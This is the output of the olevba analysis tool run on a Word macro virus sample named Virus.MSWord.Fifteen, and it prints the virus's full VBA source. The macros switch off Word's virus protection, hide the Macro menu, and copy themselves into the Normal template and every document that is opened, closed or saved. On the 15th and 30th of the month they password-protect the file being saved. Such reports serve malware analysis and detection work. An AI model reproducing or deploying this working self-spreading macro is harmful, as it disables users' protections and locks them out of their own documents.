olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fifteen-f82ec1a1ddf37e32fd2145cf41d8ee3b1c22e5c6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fifteen-f82ec1a1ddf37e32fd2145cf41d8ee3b1c22e5c6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO XvX.bas 
in file: Virus.MSWord.Fifteen-f82ec1a1ddf37e32fd2145cf41d8ee3b1c22e5c6 - OLE stream: 'Macros/VBA/XvX'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub AutoOpen()
 On Error Resume Next
   Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1):
   CommandBars("Tools").Controls("Macro").Visible = False
   Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:="XvX" _
       , Object:=wdOrganizerObjectProjectItems
End Sub

Public Sub HelpAbout()
On Error Resume Next
ans = MsgBox("   VIRUS INFECTED", vbOKOnly, ">>>>>> XVX <<<<<<")
End Sub


Public Sub AutoClose()
On Error Resume Next
   Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:="XvX", Object:=wdOrganizerObjectProjectItems
End Sub

Public Sub FileSave()
On Error Resume Next

Xdate = Date
XDay = Mid(Xdate, 3, 2)
If XDay = "15" Or XDay = "30" Then
ThisDocument.Password = ">>xvx<<"
End If

Dialogs(wdDialogFileSaveAs).Show

 Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:="XvX", Object:=wdOrganizerObjectProjectItems

End Sub


Public Sub FileSaveAs()
On Error Resume Next

Xdate = Date
XDay = Mid(Xdate, 3, 2)
If XDay = "15" Or XDay = "30" Then
ThisDocument.Password = ">>xvx<<"
End If

Dialogs(wdDialogFileSaveAs).Show

 Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:="XvX", Object:=wdOrganizerObjectProjectItems

End Sub

Public Sub AutoExec()
On Error Resume Next
   Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:="XvX", Object:=wdOrganizerObjectProjectItems

End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
